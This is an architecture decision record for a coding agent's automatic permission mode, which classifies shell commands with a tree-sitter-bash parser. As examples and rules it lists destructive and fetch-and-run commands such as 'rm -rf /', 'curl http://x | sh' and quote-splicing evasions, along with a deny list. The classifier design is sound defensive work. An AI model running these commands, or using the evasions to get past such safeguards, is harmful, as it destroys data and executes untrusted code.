# ADR-0158 — Tree-sitter-bash AUTO-mode safety classifier

- **Status:** Accepted
- **Date:** 2026-06-21
- **Sprint:** WP-0 (TUI v2 overhaul roadmap)
- **Supersedes/relates:** ADR-0157 (the permission posture engine that adds the `auto` mode this
  classifier drives), ADR-0004 (`GuardrailExtension` — the regex first-block-wins floor retained as
  defense in depth). Roadmap: `.omc/specs/tui-v2-overhaul-roadmap.md` (overrides the earlier
  "auto mode = defer" note, which predated the install/soundness proof).

## Context

The `auto` permission posture (ADR-0157) needs to decide, without a prompt, whether a shell command
is safe to run, must be blocked, or should fall back to asking. A regex approach (like the
`GuardrailExtension`) is brittle against quoting / subshell / concatenation evasions:
`echo "rm -rf /"` is harmless but a naive regex flags it; `r''m -rf /` is dangerous but a regex
misses it. An AST is structurally more sound.

## Decision

**Adopt tree-sitter-bash now.** Re-verified installable into the project venv
(`tree-sitter==0.25.2` + `tree-sitter-bash==0.25.1`; pins `tree-sitter>=0.25,<0.26`,
`tree-sitter-bash>=0.25,<0.26`) — prebuilt cross-platform wheels (linux/macos/windows), no compiler,
~3.4 MiB, `requires_python>=3.10` covers the project's `>=3.11`. Added to
`packages/aelix-coding-agent/pyproject.toml` `[project].dependencies` (core, not an extra — the gate
must run on every install path).

`builtin/bash_classifier.py` exposes a pure `classify(command) -> Verdict` over the
tree-sitter-bash AST (`Verdict.ALLOW < ASK < DENY`, so `max` picks the worst):

- **worst-of-pipeline traversal** — `command` / `pipeline` / `redirected_statement` / `list` /
  `program` / `subshell` / `compound_statement` / `command_substitution` / `process_substitution`
  bubble up the MAX verdict of their parts; control flow (`if`/`for`/`while`/`case`/function) → ASK.
- **command-name resolution** — `command_name` resolved to a literal: dynamic
  (`$(…)` / `$VAR`) → ASK; concatenation/quote-splice (`r''m`) resolved by stripping quotes;
  `/bin/rm` normalized via `rsplit("/")`; a leading `A=1` assignment is skipped.
- **rules** — DENY set `{rm,dd,mkfs,shred,fdisk,sudo,doas}`; `git` read-only subcommands → ALLOW
  else ASK; a READ_ONLY allowlist → ALLOW; pipe-into-shell at any non-first stage
  (`sh/bash/zsh/dash/ksh/fish`) → DENY; write-redirect to `/etc /dev /boot /sys /usr /bin ~/.ssh
  /root /.git` → DENY else ASK; unknown command → ASK.
- **fail-safe to ASK** — the grammar import is wrapped in a try/except at module load; on
  ImportError / ABI mismatch the parser stays `None` and `classify` returns ASK for every command.
  At call time `root_node.has_error` (malformed/partial input) → ASK, empty command → ASK, any
  traversal exception → ASK. NEVER ALLOW on uncertainty.

`PermissionMode.AUTO` is appended to `CYCLE_ORDER` (the cycle is now 5: default → auto-accept →
plan → yolo → auto → wrap). The AUTO branch in `permission.py` maps ALLOW → no prompt, ASK → the
4-option dialog, DENY → block. The regex `GuardrailExtension` is retained as the first-block-wins
floor — the classifier drives AUTO allow/ask/deny only; it does NOT relax Guardrail.

## Why it beats regex (verified, 25/25 labeled suite)

`echo "rm -rf /"` → ALLOW (quoted string, not a command); `$(echo rm) -rf /` → ASK (dynamic name);
`r''m -rf /` → DENY (concatenation resolves to `rm`); `git status && rm -rf build` → DENY
(worst-of-list); `curl http://x | sh` → DENY (pipe-into-shell); `echo hi > /etc/hosts` → DENY
(protected write); `git status` → ALLOW; unknown command → ASK; `(rm -rf /)` / `{ rm x; }` → DENY.

## Open risks

- **Grammar node-type drift** — `redirected_statement` / `file_redirect` / `concatenation` /
  `command_substitution` / `command_name` are grammar-version-specific. Mitigated by pinning
  `<0.26` + fail-safe-to-ASK on unrecognized structure + the bucket suite running on the pinned
  version in CI.
- **No-wheel platform** — an exotic platform without a prebuilt wheel would attempt an sdist build
  (needs a C compiler). The fail-safe handles the missing-grammar case (→ ASK), so the agent still
  runs without auto-allow and the other four postures are unaffected.
- **Crude literal resolution by design** — `${x}` indirection / brace-glob / `base64|sh`
  constructed at runtime resolve to dynamic → ASK. Do NOT extend the ALLOW allowlist without
  re-running the full evasion suite.

## Consequences

`auto` mode ships this sprint as an isolated last step; a wheel/grammar problem fails safe to ASK
and cannot block the other four postures. The classifier is pure + dependency-injected (the parser
is the only impure part, built once at import behind a guard), unit-tested without the TUI.
